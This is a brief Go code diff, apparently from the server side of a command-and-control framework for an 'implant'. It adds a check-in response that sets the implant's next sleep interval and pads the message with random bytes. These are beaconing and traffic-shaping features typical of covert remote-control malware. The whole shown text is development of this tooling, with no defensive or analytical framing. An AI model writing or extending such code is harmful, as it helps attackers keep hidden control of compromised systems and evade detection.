@@ -20,6 +20,7 @@ const (
 	tlvPID       byte = 0x14
 	tlvExecRes   byte = 0x20
 	tlvFileRes   byte = 0x30
+	tlvNextHint  byte = 0x44
 )
 
 // Task types queued by the console.
@@ -211,4 +212,16 @@ func cloneBytes(b []byte) []byte {
 	out := make([]byte, len(b))
 	copy(out, b)
 	return out
+}
+
+// buildCheckinResponse appends the adaptive-interval hint (0x44) and the size
+// pad to the encoded task TLVs. nextIntervalSec is authoritative for the
+// implant's next sleep; 0 means "keep current".
+func buildCheckinResponse(taskPayload []byte, nextIntervalSec uint32, padLen int) []byte {
+	hint := binary.LittleEndian.AppendUint32(nil, nextIntervalSec)
+	items := []tlv{
+		{Type: tlvNextHint, Value: hint},
+		{Type: tlvPad, Value: randomBytes(padLen)},
+	}
+	return append(taskPayload, encodeTLVs(items)...)
 }
